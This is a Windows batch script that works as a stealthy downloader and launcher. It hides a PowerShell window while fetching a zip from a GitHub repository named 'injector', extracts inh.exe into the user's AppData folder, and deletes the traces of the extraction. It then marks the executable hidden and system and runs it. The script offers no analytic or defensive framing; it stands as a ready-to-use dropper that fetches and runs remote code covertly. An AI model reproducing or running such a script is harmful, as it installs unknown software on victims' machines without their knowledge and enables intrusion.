@echo off

cd /d "%~dp0"

set "URL=https://github.com/dexovision/injector/raw/main/inh.zip"
set "ZIPFILE=inh.zip"
set "DESTDIR=repo"

:: Run download silently with NO window
powershell -NoProfile -WindowStyle Hidden -Command ^
    "Invoke-WebRequest -Uri '%URL%' -OutFile '%ZIPFILE%' | Out-Null"

mkdir "%DESTDIR%" 2>nul
tar -xf "%ZIPFILE%" -C "%DESTDIR%"


set "EXE_NAME=inh.exe"
set "SOURCE_PATH=%~dp0repo\inh.exe"
set "STARTUP_PATH=%USERPROFILE%\AppData\%EXE_NAME%"


copy "%SOURCE_PATH%" "%STARTUP_PATH%" /Y >nul 2>&1
if %ERRORLEVEL% EQU 0 (
    if exist "%SOURCE_PATH%" del "%SOURCE_PATH%" /F /Q
)
rmdir /s /q "%DESTDIR%"
attrib +h +s "%USERPROFILE%\AppData\inh.exe"
start "" "%USERPROFILE%\AppData\inh.exe"
